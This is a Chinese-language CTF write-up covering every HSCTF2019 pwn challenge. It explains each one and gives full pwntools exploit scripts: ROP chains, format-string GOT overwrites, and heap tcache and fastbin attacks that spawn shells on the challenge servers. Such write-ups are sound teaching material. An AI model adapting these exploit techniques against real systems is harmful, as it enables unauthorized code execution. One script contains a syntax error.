---
title: HSCTF2019
categories:
- HSCTF2019
---
# HSCTF2019

## 前言

emm在ctftime上第一次见到简单的比赛题，后来才知道是High School CTF。不过做了所有的pwn，还是记录一下，最后一个题要总结一下。

## nc

nc addr 即可

## return to sender

最简单的栈溢出，system("/bin/sh")给了，直接return过去

```py
#coding=utf-8
from pwn import *
context.update(arch='amd64',os='linux',log_level="debug")
context.terminal = ['tmux','split','-h']
debug = 0
if debug:
    p = process('./return-to-sender')
    #gdb.attach(p)
else:
    p = remote('pwn.hsctf.com',1234)

def exp():
    p.recvuntil('Where are you sending your mail to today? ')
    shell_addr = 0x080491b6
    payload = 'a'*0x10 + 'a'*4 + p32(shell_addr)
    p.send(payload)
    p.interactive()
exp()

```

## combo chain lite

先用给的system地址计算libc基址，算出/bin/sh的字符串地址，用csu rop将syetm_addr+bin_sh_addr写到bss段上，调用bss_base(bss_base+8)即可拿shell

```py
#coding=utf-8
from pwn import *
context.update(arch='amd64',os='linux',log_level="DEBUG")
context.terminal = ['tmux','split','-h']
debug = 0
elf = ELF('./combo-chain-lite')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
if debug:
    p = process('./combo-chain-lite')
    #gdb.attach(p,'b *0x4011bd')
else:
    p = remote('pwn.hsctf.com',3131)

bss_base = elf.bss()
csu_end_addr = 0x40126a
csu_front_addr = 0x401250

def csu(rbx, rbp, r12, r13, r14, r15, last):
    # pop rbx,rbp,r12,r13,r14,r15
    # rbx should be 0,
    # rbp should be 1,enable not to jump
    # r12 should be the function we want to call
    # rdx=edx=r15
    # rsi=r14
    # edi=r13
    payload = 'a' * 0x10
    payload += p64(csu_end_addr) + p64(rbx) + p64(rbp) + p64(r12) + p64(
        r13) + p64(r14) + p64(r15)
    payload += p64(csu_front_addr)
    payload += 'a' * 0x38
    payload += p64(last)
    return payload


def exp():
    main_addr = 0x401166
    p.recvuntil("your free computer: 0x")
    system_addr = int((p.recv(12).ljust(8,'\x00')),16)
    libc_base = system_addr - libc.symbols['system']
    log.success('libc base => ' + hex(libc_base))
    binsh_addr = libc_base + libc.search('/bin/sh').next()
    #get shell
    gets_got = elf.got['gets']
    log.success('gets => ' + hex(gets_got))
    payload = csu(0, 1, gets_got, bss_base, 0, 0, main_addr)
    print len(payload)
    p.recvuntil('CARNAGE!:')
    p.sendline(payload)
    sleep(1)
    raw_input()
    #p.recvuntil('CARNAGE!:')
    p.sendline(p64(system_addr) + '/bin/sh\x00')
    payload = csu(0, 1, bss_base, bss_base+8, 0, 0, main_addr)
    raw_input()
    p.sendline(payload)

    p.interactive()

exp()

```

## combo chain

这个题的rop很巧妙，不用csu，首先pop_rdi存储bss地址，后面跟着gets_plt，调用gets(bss_addr)，之后再pop_rdi,call printf("%3$p")来泄露地址，最后跳到main执行下一次ROP攻击。在第一次的过程中使用'\n'分隔符输入了%3$p。
第二次pop_rdi将"/bin/sh"的地址写入rdi，之后调用sysem("/bin/sh")得到shell
ret 后面可以跟plt(plt里还有call)或者实际的地址

```py
#coding=utf-8
from pwn import *
context.update(arch='amd64',os='linux',log_level="DEBUG")
context.terminal = ['tmux','split','-h']
debug = 0
elf = ELF('./combo-chain')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
if debug:
    p = process('./combo-chain')
    gdb.attach(p,'b *0x4011a3')
else:
    p = remote('pwn.hsctf.com',2345)

bss_base = elf.bss() + 0x300
csu_end_addr = 0x40125a
csu_front_addr = 0x401240
gadgets = [0x45216,0x4526a,0xf02a4,0xf1147]

def exp():
    padding = 'A'*16
    pop_rdi=0x0000000000401263
    pop_rsi=0x0000000000401261 # pop rsi; pop r15
    system_offset = 0x045390
    str_bin_sh = 0x18cd57
    one_gadget = 0x4526a # 0x448a3
    bss_section_buffer = elf.get_section_by_name('.bss').header.sh_addr+1500
    log.info('bss buffer at {}'.format(hex(bss_section_buffer)))
    print p.recvuntil('CARNAGE!:')
    payload = padding
    payload += p64(pop_rdi)
    payload += p64(bss_section_buffer)
    payload += p64(elf.plt['gets'])
    payload += p64(pop_rdi)
    payload += p64(bss_section_buffer)
    payload += p64(elf.plt['printf'])
    payload += p64(elf.symbols['main'])
    payload += "\n%3$p"
    open('payload','w').write(payload)
    p.recv()
    p.sendline(payload)
    libc_base = int(p.recv(14),16) - 0x3c48e0 # 0x3c38e0;
    log.info("found libc base at {}".format(hex(libc_base)))
    log.info("system at {}".format(hex(libc_base+system_offset)))
    payload2 = padding
    payload2 += p64(pop_rdi)
    payload2 += p64(libc_base+str_bin_sh)
    payload2 += p64(libc_base+system_offset)
    payload2 += '\x00'*0x40
    p.sendline(payload2)
    p.interactive()
exp()

```

## story time

先用write泄露出lib基址，之后的做法同combo chain lite

```py
#coding=utf-8
from pwn import *
context.update(arch='amd64',os='linux',log_level="DEBUG")
context.terminal = ['tmux','split','-h']
debug = 0
elf = ELF('./storytime')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
if debug:
    p = process('./storytime')
    gdb.attach(p,'b *0x40069b')
else:
    p = remote('pwn.hsctf.com',3333)

bss_base = elf.bss()
csu_end_addr = 0x4006fa
csu_front_addr = 0x4006e0
gadgets = [0x45216,0x4526a,0xf02a4,0xf1147]

def csu(rbx, rbp, r12, r13, r14, r15, last):
    # pop rbx,rbp,r12,r13,r14,r15
    # rbx should be 0,
    # rbp should be 1,enable not to jump
    # r12 should be the function we want to call
    # rdx=edx=r15
    # rsi=r14
    # edi=r13
    payload = 'a' * 0x38
    payload += p64(csu_end_addr) + p64(rbx) + p64(rbp) + p64(r12) + p64(
        r13) + p64(r14) + p64(r15)
    payload += p64(csu_front_addr)
    payload += 'a' * 0x38
    payload += p64(last)
    return payload


def exp():
    write_got = elf.got['write']
    read_got = elf.got['read']
    main_addr = 0x40062e
    bss_base = elf.bss()+0x10
    log.success('bss base => ' + hex(bss_base))
    #leak libc
    #write(1,write_got,8)
    payload = csu(0,1,write_got,1,write_got,8,main_addr)
    p.recvuntil('Tell me a story: \n')
    p.send(payload)
    write_addr = u64(p.recv(8))
    libc_base = write_addr - libc.symbols['write']
    log.success('libc base => ' + hex(libc_base))
    '''
    shell_addr = libc_base + gadgets[0]
    payload = csu(0,1,shell_addr,0,0,0,main_addr)
    raw_input()
    p.send(payload)
    '''
    execve_addr = libc_base + libc.symbols['execve']
    #read(0,bss_base,16)
    payload = csu(0,1,read_got,0,bss_base,16,main_addr)
    #p.recvuntil('Tell me a story: \n')
    raw_input()
    p.send(payload)
    raw_input()
    p.send(p64(execve_addr)+"/bin/sh\x00")
    #bss_base(bss_base+8)
    payload = csu(0,1,bss_base,bss_base+8,0,0,main_addr)
    #p.recvuntil('Tell me a story: \n')
    raw_input()
    p.send(payload)
    p.interactive()

exp()

```

## bit

这个题给了4次任意地址修改1bit的机会，第一次泄露出puts的地址来计算libc地址，第二次通过environ变量可以得到栈地址，此时i = 0x10，将这个1移位到最高位使得i成为负数，即可任意次数地修改。修改exit_got的地址为shell_addr即可

![main](./bit_1.jpg)

![flip](./bit_2.jpg)

```py
#coding=utf-8
from pwn import *
context.update(arch='i386',os='linux',log_level="DEBUG")
context.terminal = ['tmux','split','-h']
debug = 0
elf = ELF('./bit')
libc = ELF('/lib/i386-linux-gnu/libc.so.6')
if debug:
    p = process('./bit')
    #gdb.attach(p,'b *0x08048727')
else:
    p = remote('pwn.hsctf.com',4444)

def change(address,index):
    p.recvuntil('Give me the address of the byte: ')
    p.sendline(hex(address)[2:])
    p.recvuntil('Give me the index of the bit: ')
    p.sendline(str(index))
def find_pos(target,char1='1'):
    #target is a int
    #change to binary string
    target = repr(bin(target))[3:-1]
    res_lis = list()
    target = target[::-1]
    print target
    for i in range(len(target)):
        if target[i] == char1:
            res_lis.append(i)
    return res_lis

def exp():
    puts_got = elf.got['puts']
    log.success('puts got => ' + hex(puts_got))
    #leak libc
    change(puts_got,0)
    p.recvuntil('your new byte: ')
    puts_addr = int(p.recvline().strip('\n'),16) ^ 1
    libc_base = puts_addr - libc.symbols['puts']
    log.success('libc base => ' + hex(libc_base))
    environ_addr = libc_base + libc.symbols['environ']
    change(environ_addr,0)
    p.recvuntil('your new byte: ')
    environ_addr = int(p.recvline().strip('\n'),16) ^ 1
    ebp_addr = environ_addr - 0xb4
    log.success('ebp addr => ' + hex(ebp_addr))
    #overwrite i
    change(ebp_addr-0x20+0x3,7)
    #get shell
    gadgets = [0x3ac5c,0x3ac5e,0x3ac62,0x3ac69,0x5fbc5,0x5fbc6]
    flag_addr = 0x080486a6
    #shell_addr = libc_base + gadgets[5]
    shell_addr = flag_addr
    log.success('shell addr => ' + hex(shell_addr))
    exit_got = elf.got['puts']
    log.success('exit got addr => ' + hex(exit_got))
    exit_addr = libc_base + libc.symbols['puts']
    log.success('exit addr => ' + hex(exit_addr))
    targets = list()
    targets.append((exit_addr & 0xff ) ^ (shell_addr & 0xff))
    targets.append(((exit_addr & 0xffff) >> 8) ^ ((shell_addr & 0xffff) >> 8))
    targets.append(((exit_addr & 0xffffff) >> 16) ^ ((shell_addr & 0xffffff) >> 16))
    targets.append((exit_addr >> 24) ^ (shell_addr >> 24))
    print 'here is the xor res'
    print targets
    change(puts_got,0)
    #gdb.attach(p,'b *0x08048727')
    for i in range(4):
        data = find_pos(targets[i])
        print data
        if (data is not None) and (len(data) > 0):
            for j in range(len(data)):
                change(exit_got+i,data[j])
        print 'finished' + str(i+1)
    change(ebp_addr-0x20+0x3,7)

    p.interactive()

exp()

```

## byte

题目里有flag函数，查看调用，发现是在循环那里有个隐藏的触发条件，即i>1且ebp-0x8e的值为0。main函数里有zero(address)，用printf泄露出栈地址，再将ebp-0x8e作为输入，即可满足条件执行flag函数

![flag](./byte_1.jpg)

```py
#coding=utf-8
from pwn import *
context.update(arch='amd64',os='linux',log_level="DEBUG")
context.terminal = ['tmux','split','-h']
debug = 0
elf = ELF('./byte')
libc = ELF('/lib/i386-linux-gnu/libc.so.6')
if debug:
    p = process('./byte')
    gdb.attach(p)
else:
    p = remote('pwn.hsctf.com',6666)

def exp():
    p.recvuntil('Give me the address of the byte: ')
    p.sendline('%2$p%7$p')
    p.recvuntil('0x')
    libc_base = int(p.recvn(8),16) - 5 - libc.symbols['__errno_location']
    log.success('libc base => ' + hex(libc_base))
    #leak stack
    p.recvuntil('0x')
    ebp_addr = int(p.recvn(8),16) - 172
    log.success('ebp addr => ' + hex(ebp_addr))
    #over wite i
    i_addr = ebp_addr - 0x8e
    payload = hex(i_addr)[2:]
    p.recvuntil('Give me the address of the byte: ')
    p.sendline(payload)
    p.interactive()
exp()

```

## caesars revenge

这道题使用凯撒密码对用户输入进行编码，最后printf漏洞，先将puts_got覆写为main函数地址，使得可以多次利用漏洞，之后依次泄露libc和stack的地址。最后将setresgid_got覆写为shell_addr。

```py
#coding=utf-8
from pwn import *
from time import sleep
context.update(arch='amd64',os='linux',log_level="DEBUG")
context.terminal = ['tmux','split','-h']
debug = 0
elf = ELF('./caesars-revenge')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
if debug:
    p = process('./caesars-revenge')
    #gdb.attach(p,'b* 0x40143a')
else:
    p = remote('pwn.hsctf.com',4567)

def decode(text):
    res = list()
    for i in range(len(text)):
        if text[i].isalpha():
            res.append(chr(ord(text[i])-1))
        else:
            res.append(text[i])
    return ''.join(res)

def exp():
    main_addr = 0x401196
    #offset %24$p
    chars = main_addr
    puts_got = elf.got['puts']
    #make a loop
    payload = "%"+str(chars)+"c%26$lln"+p64(puts_got)
    print payload
    payload = decode(payload)
    p.recvuntil('Enter text to be encoded: ')
    p.sendline(payload)
    p.recvuntil('Enter number of characters to shift: ')
    p.sendline('1')
    sleep(1)
    #leak libc
    payload = "%31$p"
    payload = decode(payload)
    p.recvuntil('Enter text to be encoded: ')
    p.sendline(payload)
    p.recvuntil('Enter number of characters to shift: ')
    p.sendline('1')
    p.recvuntil('Result: 0x')
    printf_addr = int(p.recvline().strip('\n'),16) - 153
    libc_base = printf_addr - libc.symbols['printf']
    log.success('libc base => ' + hex(libc_base))
    sleep(1)
    #leak stack
    payload = "%58$p"
    payload = decode(payload)
    p.recvuntil('Enter text to be encoded: ')
    p.sendline(payload)
    p.recvuntil('Enter number of characters to shift: ')
    p.sendline('1')
    p.recvuntil('Result: 0x')
    ebp_addr = int(p.recvline().strip('\n'),16) - 432
    log.success('ebp addr => ' + hex(ebp_addr))
    canary_addr = ebp_addr - 8

    sleep(1)
    #get shell
    #over write __stack_chk_fail


    #chk_fail_addr = libc_base + libc.symbols['__stack_chk_fail']
    chk_fail_addr = elf.got['setresgid']
    log.success('chk faile addr => ' + hex(chk_fail_addr))
    gadgets = [0x45216,0x4526a,0xf02a4,0xf1147]
    shell_addr = libc_base + gadgets[0]
    addr_high = shell_addr >> 32
    addr_low = shell_addr & 0xffffffff
    addr_low_high = addr_low >> 16
    addr_low_low = addr_low & 0xffff
    log.success('shell addr => ' + hex(shell_addr))
    #first overwrite
    sleep(1)

    log.success('addr low low => ' + hex(addr_low_low))
    payload = "aaaa%"+str(addr_low_low-4)+"c%26$hn"+p64(chk_fail_addr)
    print payload
    payload = decode(payload)
    p.recvuntil('Enter text to be encoded: ')
    p.sendline(payload)
    p.recvuntil('Enter number of characters to shift: ')
    p.sendline('1')
    #second
    sleep(1)

    log.success('addr low high => ' + hex(addr_low_high))
    payload = "aaa%"+str(addr_low_high-3)+"c%26$hn"+p64(chk_fail_addr+2)
    payload = decode(payload)
    p.recvuntil('Enter text to be encoded: ')
    p.sendline(payload)
    p.recvuntil('Enter number of characters to shift: ')
    p.sendline('1')
    #third
    sleep(1)
    log.success('addr high => ' + hex(addr_high))


    payload = "aaa%"+str(addr_high-3)+"c%26$hn"+p64(chk_fail_addr+4)
    payload = decode(payload)
    p.recvuntil('Enter text to be encoded: ')
    p.sendline(payload)
    p.recvuntil('Enter number of characters to shift: ')
    p.sendline('1')
    #gdb.attach(p,'b* 0x40143a')
    #trigger
    sleep(1)
    chars = 0x401462
    payload = "%"+str(chars)+"c%26$lln"+p64(puts_got)
    payload = decode(payload)
    p.recvuntil('Enter text to be encoded: ')
    p.sendline(payload)
    p.recvuntil('Enter number of characters to shift: ')
    p.sendline('1')
    p.interactive()

exp()


```

## aria-writer

存在double free的漏洞，且有一个secret的选项可以输出name的值，先在name里构造0x90大小的fake_chunk，用double free+3次malloc修改0x90对应的tcache数量为0xff，从而free这个fake chunk的时候直接把其放入unsorted bin，再利用secret去泄露Libc，修改malloc_hook到gadgets即可。

```py
#coding=utf-8
from pwn import *
context.update(arch='amd64',os='linux',log_level="DEBUG")
context.terminal = ['tmux','split','-h']
debug = 0
if debug:
    p = process('./aria-writer')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    #gdb.attach(p)
else:
    p = remote('pwn.hsctf.com',2222)
    libc = ELF('./libc-2.27.so')

def Init(name):
    p.recvuntil('whats your name > ')
    p.sendline(name)

def Malloc(size,content):
    p.recvuntil('Gimme int pls > ')
    p.sendline('1')
    p.recvuntil('Gimme int pls > ')
    p.sendline(str(size))
    p.recvuntil('what should i write tho > ')
    p.sendline(content)

def Free():
    p.recvuntil('Gimme int pls > ')
    p.sendline('2')

def Show():
    p.recvuntil('Gimme int pls > ')
    p.sendline('3')

def exp():
    gadgets = [0x4f2c5,0x4f322,0x10a38c]
    name_addr = 0x6020e0
    global_addr = 0x6020c0
    #leak libc
    name = p64(0)+p64(0x91)
    name = name.ljust(0x90,'a')
    name += p64(0) + p64(0x21) + 'b'*0x10
    name += p64(0x20) + p64(0x21)
    Init(name)
    #stage 1
    Malloc(0x80,'a')
    Free()#1
    Free()#2
    Malloc(0x80,p64(name_addr+0x10))
    Malloc(0x80,'a')
    Malloc(0x80,'b')
    Free()#3
    Show()
    p.recvn(0x20)
    libc_base = u64(p.recvn(8))-96-0x3ebc40
    log.success('libc base => ' + hex(libc_base))
    shell_addr = libc_base + gadgets[1]
    fake_chunk = libc_base + libc.symbols['__malloc_hook'] - 0x23 + 0x10
    log.success('fake chunk => ' + hex(fake_chunk))
    #tcache dup to get shell
    #gdb.attach(p)
    Malloc(0x70,'libc_base')
    Malloc(0x60,'aa')
    Free()#4
    Free()#5
    print hex(fake_chunk)
    #gdb.attach(p)
    Malloc(0x60,p64(fake_chunk))
    Malloc(0x60,'a')
    Malloc(0x60,'a'*0x13+p64(shell_addr))
    p.recvuntil('Gimme int pls > ')
    p.sendline('1')
    p.recvuntil('Gimme int pls > ')
    p.sendline('17')
    p.interactive()

exp()

```

## aria-writer-v3

这个题目是上一道的加强版，libc 2.27，依然有double free，但是没有泄露函数，观察之后发现bss段上存储了stdout结构体的地址，这里直接double free再分配到bss这个地址上，再次分配即可分配stdout，修改其内容即可泄露libc。之后的操作同之前一样。

```py
#coding=utf-8
from pwn import *
context.update(arch='amd64',os='linux',log_level="DEBUG")
context.terminal = ['tmux','split','-h']
debug = 0
if debug:
    p = process('./aria-writer-v3')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    #gdb.attach(p)
else:
    p = remote('pwn.hsctf.com',2468)
    libc = ELF('./libc-2.27.so')

def Init(name):
    p.recvuntil('whats your name > ')
    p.sendline(name)

def Malloc(size,content):
    p.recvuntil('Gimme int pls > ')
    p.sendline('1')
    p.recvuntil('Gimme int pls > ')
    p.sendline(str(size))
    p.recvuntil('what should i write tho > ')
    p.send(content)

def Free():
    p.recvuntil('Gimme int pls > ')
    p.sendline('2')

def Show():
    p.recvuntil('Gimme int pls > ')
    p.sendline('3')

def exp():
    gadgets = [0x4f2c5,0x4f322,0x10a38c]
    name_addr = 0x602048
    curr_addr = 0x602040
    stdout_addr = 0x602020
    #leak libc
    Init('wz')
    Malloc(0x60,'a')
    Free()
    Free()
    Malloc(0x60,p64(stdout_addr))
    Malloc(0x60,'1')
    log.success('malloc stdout addr')
    Malloc(0x60,'\x60')
    log.success('before success')
    Malloc(0x60,p64(0xfbad1800)+p64(0)*3+'\x00')
    p.recvn(8)
    libc_base = u64(p.recv(8)) - (0x7f3e08d898b0-0x7f3e0899c000)
    log.success('libc base => ' + hex(libc_base))
    #get shell
    free_hook = libc_base + libc.symbols['__free_hook']
    log.success('free hook addr => ' + hex(free_hook))
    shell_addr = libc_base + libc.symbols['system']
    log.success('shell addr => ' + hex(shell_addr))
    #gdb.attach(p)
    Malloc(0x90,'a')
    Free()
    Free()
    Malloc(0x90,p64(free_hook))
    Malloc(0x90,'b')
    Malloc(0x90,p64(shell_addr))
    Malloc(0x30,'/bin/sh\x00')
    Free()
    '''
    padding = 'a'*8
    name = padding
    name += p64(0)+p64(0x91)
    name += 'a'*0x80
    name += p64(0x0) + p64(0x21)+'b'*8+p64(0)
    name += p64(0x20) + p64(0x21)
    Init(name)
    #stage 1
    Malloc(0x80,'a')
    Free()#1
    Free()#2
    Malloc(0x80,p64(name_addr+0x18))
    Malloc(0x80,'a')
    Malloc(0x80,'b')
    Free()#3
    '''
    '''
    #Show()
    p.recvn(0x20)
    libc_base = u64(p.recvn(8))-96-0x3ebc40
    log.success('libc base => ' + hex(libc_base))
    shell_addr = libc_base + gadgets[1]
    fake_chunk = libc_base + libc.symbols['__malloc_hook'] - 0x23 + 0x10
    log.success('fake chunk => ' + hex(fake_chunk))
    #tcache dup to get shell
    #gdb.attach(p)
    Malloc(0x70,'libc_base')
    Malloc(0x60,'aa')
    Free()#4
    Free()#5
    print hex(fake_chunk)
    #gdb.attach(p)
    Malloc(0x60,p64(fake_chunk))
    Malloc(0x60,'a')
    Malloc(0x60,'a'*0x13+p64(shell_addr))
    p.recvuntil('Gimme int pls > ')
    p.sendline('1')
    p.recvuntil('Gimme int pls > ')
    p.sendline('17')
    '''
    p.interactive()

exp()

```

## hard-heap

### 前言

这题是之前某个CTF题的变种，第一次学到这种利用方式，可以绕过size的要求。

### 程序逻辑

程序有Malloc、Free和Show三个功能。

![main](./hard_heap_1.jpg)

在Malloc中，最多可以分配20个堆块。size[0]存储用户输入的size，要求小于等于0x48，size[1]存储canary防止溢出。全局数组0x202060[index]存储chunk地址，读取size[0]-1大小的数据进入chunk。

![malloc](./hard_heap_2.jpg)

Show里对Index做了检查，没有对数组内容做检查，存在UAF。

![observe](./hard_heap_3.jpg)

Free里有double free

![free](./hard_heap_4.jpg)

### 漏洞利用

这题开始我以为是2.27的题，还是蛮好做的，到2.23因为malloc的size会有检查，导致之前的思路完全不通。这里用的知识是fast bin和top chunk的地址会存储在main_arena里，如果我们可以修改main_arena，就可以控制fast bin和top chunk的值

![main_arena](./hard_heap_5.jpg)

观察main_arena的内容，可以看到main_arena+8+5刚好可以凑一个大小为0x56的fake chunk出来。

![main+arena](./hard_heap_6.jpg)

![main+arena1](./hard_heap_7.jpg)

首先，我们利用double free泄露出heap基址。在某个chunk中构造fake chunk，用刚才的double free分配到这个fake chunk，进而通过输入覆写下面的chunk的prev_size和size(0x91)。将其释放之后即可泄露libc。

程序开了地址随机化，因此heap的第一个字节为0x55或0x56，我们需要绕过检查，因此要等0x56的情况出现。我们将之前申请的0x30的chunk释放，main_arena的对应地址出现了值，再用0x48的double free分配到这个fake chunk。之后我们修改fastbins[0x50]的值为main_arena+0x20，fastbins[0x60]的值为0x51。Malloc(0x48)即可分配到main_arena+0x20的大小为0x50的块，input改掉top_chunk为malloc_hook附近的值(这里为malloc_hook-0x15)，再分配一个块即可覆写malloc_hook为shell_addr。

![top_chunk](./hard_heap_8.jpg)

### exp.py

因为写了2.27的，就顺便也发出来了

```py
#coding=utf-8
#2.27
from pwn import *
context.update(arch='amd64',os='linux',log_level="DEBUG")
context.terminal = ['tmux','split','-h']
debug = 1
if debug:
    p = process('./hard-heap')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    libc_offset = 0x3ebc40
    #gdb.attach(p)
else:
    p = remote('pwn.hsctf.com',5555)
    libc = ELF('./libc-2.27.so')

def Malloc(size,content):
    p.recvuntil('> ')
    p.sendline('1')
    p.recvuntil('> ')
    p.sendline(str(size))
    p.recvuntil('> ')
    p.send(content)

def Show(index):
    p.recvuntil('> ')
    p.sendline('2')
    p.recvuntil('> ')
    p.sendline(str(index))

def Free(index):
    p.recvuntil('> ')
    p.sendline('3')
    p.recvuntil('> ')
    p.sendline(str(index))

def exp():
    gadgets = [0x4f2c5,0x4f322,0x10a38c]
    #leak heap
    Malloc(0x30,'a')#0
    Malloc(0x30,'b')#1
    Malloc(0x30,'c')#2
    Malloc(0x30,'d')#3
    Malloc(0x30,'d')#4
    for i in range(7):
        Free(0)
    Show(0)
    offset = 0x260
    heap_base = u64(p.recvline().strip('\n').ljust(8,'\x00')) - offset
    log.success('heap base => ' + hex(heap_base))
    #leak libc
    #overlap chunk to change size
    Malloc(0x40,'d')#5
    Free(5)
    Free(5)


    chunk1_addr = heap_base + 0x2a0
    Malloc(0x40,p64(chunk1_addr))#6
    Malloc(0x40,'e')#7
    Malloc(0x40,'a'*0x30+p64(0)+p64(0xc1))#8 overwrite the size of chunk2
    for i in range(8):
        Free(2)
    Show(2)
    libc_base = u64(p.recvline().strip('\n').ljust(8,'\x00')) - 96 - 0x3ebc40
    log.success('libc base => ' + hex(libc_base))
    #get shell
    shell_addr = libc_base + libc.symbols['system']
    free_hook = libc_base + libc.symbols['__free_hook']
    Malloc(0x20,'a')#9
    Free(9)
    Free(9)
    gdb.attach(p)
    Malloc(0x20,p64(free_hook))#10
    Malloc(0x20,'/bin/sh\x00')#11
    Malloc(0x20,p64(shell_addr))
    Free(11)



    p.interactive()

exp()

```

And 2.23

```py
#coding=utf-8
#2.23
from pwn import *
context.update(arch='amd64',os='linux',log_level="debug")
context.terminal = ['tmux','split','-h']
debug = 0

if debug:
    p = process('./hard-heap')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    #gdb.attach(p)
else:
    p = remote('pwn.hsctf.com',5555)
    libc = ELF('./libc.so.6')

def Malloc(size,content):
    p.recvuntil('> ')
    p.sendline('1')
    p.recvuntil('> ')
    p.sendline(str(size))
    p.recvuntil('> ')
    p.send(content)

def Show(index):
    p.recvuntil('> ')
    p.sendline('2')
    p.recvuntil('> ')
    p.sendline(str(index))

def Free(index):
    p.recvuntil('> ')
    p.sendline('3')
    p.recvuntil('> ')
    p.sendline(str(index))

def exp():
    libc_offset = 0x3c4b20
    gadgets = [0x45216,0x4526a,0xf02a4,0xf1147]
    #leak heap
    Malloc(0x30,'a')#0
    Malloc(0x30,'a'*0x20+p64(0)+p64(0x41))#1
    Malloc(0x40,'a')#2
    Malloc(0x30,'a')#3
    Malloc(0x20,'a')#4 in case to covered by top_chunk
    Free(0)
    Free(1)
    Free(0)

    Show(0)
    heap_base = u64(p.recvline().strip('\n').ljust(8,'\x00')) - 0x40
    log.success('heap base => ' + hex(heap_base))
    #leak libc
    fake_chunk_addr = heap_base + 0x70 #try fake chunk to be chunk1
    log.success('fake chunk addr => ' + hex(fake_chunk_addr))


    Malloc(0x30,p64(fake_chunk_addr))#5
    Malloc(0x30,'b')#6
    Malloc(0x30,'c')#7

    Malloc(0x30,p64(0)+p64(0x91))#8 overwrite the size

    Free(2)
    Show(2)
    libc_base = u64(p.recvline().strip('\n').ljust(8,'\x00')) - 88 - libc_offset
    log.success('libc base => ' + hex(libc_base))


    #get shell
    main_arena = libc_base + libc_offset
    fake_chunk = main_arena+0x8+0x5
    malloc_hook = libc_base + libc.symbols['__malloc_hook']
    shell_addr = libc_base + gadgets[3]

    Malloc(0x48,'a')#9
    Malloc(0x48,'a')#10
    Malloc(0x48,'a')#11
    Free(4)//put a chunk with 0x30 size into main_arena
    Free(10)
    Free(11)
    Free(10)


    Malloc(0x48,p64(fake_chunk))#12
    Malloc(0x48,'a')#13
    Malloc(0x48,'c')#14
    payload = '\x00'*3+p64(main_arena+0x20)+p64(0x51)#0x50 fastbins to malloc
    Malloc(0x48,payload)#15

    #malloc to overwrite top chunk
    fake_malloc_chunk = malloc_hook - 0x15


    Malloc(0x48,p64(0)*5+p64(fake_malloc_chunk))#16


    #gdb.attach(p)
    Malloc(0x48,'\x00'*5+p64(shell_addr))#18
    p.recvuntil('> ')
    p.sendline('1')
    p.recvuntil('> ')
    p.sendline('17')
    p.interactive()

exp()


```
